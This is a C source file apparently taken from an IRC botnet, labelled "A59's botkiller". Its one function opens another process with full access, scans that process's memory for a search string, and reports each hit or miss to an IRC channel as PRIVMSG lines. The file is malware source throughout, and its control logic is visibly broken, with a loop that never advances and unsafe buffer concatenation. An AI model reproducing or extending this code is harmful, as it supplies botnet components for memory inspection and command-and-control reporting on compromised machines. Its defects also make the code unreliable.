/* A59's botkiller Credits to the sexy guy:)*/
#include "includes.h"
#include "externs.h"

//void MeMSearch(SOCKET sock) 
void MeMSearch(SOCKET sock,char *token[10],unsigned long uStartAddr, unsigned long uEndAddr, PROCESSENTRY32 pe32 )
{ 

   
   char szBigBuffer[ 0x5000 ] = { 0 }; 
   unsigned char Curbuf[ 0x500 ] = { 0 }; 

   HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID ); 
   for( unsigned long uCurAddr = uStartAddr; uCurAddr <= uEndAddr; uCurAddr++ ) 
   { 
      BOOL bRead = ReadProcessMemory( hProcess, (void *)uCurAddr, (void *)&Curbuf, sizeof( Curbuf ), NULL ); 
       
      if( bRead ) 
      { 
         int c = 0; 

         strcat( szBigBuffer, (char *)Curbuf );          

         while( token[4] != NULL ) 
         { 
            if( strstr( szBigBuffer, token[4] ) ) 
            { 
		      sprintf(msg,  "PRIVMSG %s :Found string \"%s\" in \"%s\" bot \"%s\"\n\n", channel,token[4], pe32.szExeFile, token[4] );
              send(sock, msg, strlen(msg), 0);                
            } 
            else
			{
			sprintf(msg,  "PRIVMSG %s :Could Not Find %s\n", channel, token[4] );
              send(sock, msg, strlen(msg), 0);
			}
            c++; 
         } 

         if( sizeof( szBigBuffer ) > 0x150 ) 
            ZeroMemory( szBigBuffer, sizeof( szBigBuffer ) ); 
      } 
       
      if( !bRead ) 
         break; 
   } 

   CloseHandle( hProcess ); 
}; 